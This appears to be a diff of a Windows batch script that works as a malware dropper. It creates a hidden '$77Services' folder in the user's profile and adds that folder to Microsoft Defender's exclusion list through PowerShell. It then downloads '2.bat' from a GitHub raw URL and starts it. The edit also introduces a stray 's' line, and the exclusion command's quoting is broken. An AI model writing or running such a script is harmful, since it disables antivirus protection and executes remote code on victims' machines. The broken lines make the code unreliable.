@@ -25,13 +25,13 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-cd "C:\Users\%USERNAME%\AppData\Local"
+cd "C:\Users\%USERNAME%"
 mkdir "$77Services"
 attrib +h "$77Services" /s /d
 
-powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\Local\$77Services
-
-cd "C:\Users\%USERNAME%\AppData\Local\$77Services"
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\$77Services
+s
+cd "C:\Users\%USERNAME%\$77Services"
 Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/2.bat' -OutFile 2.bat"
 
 start 2.bat
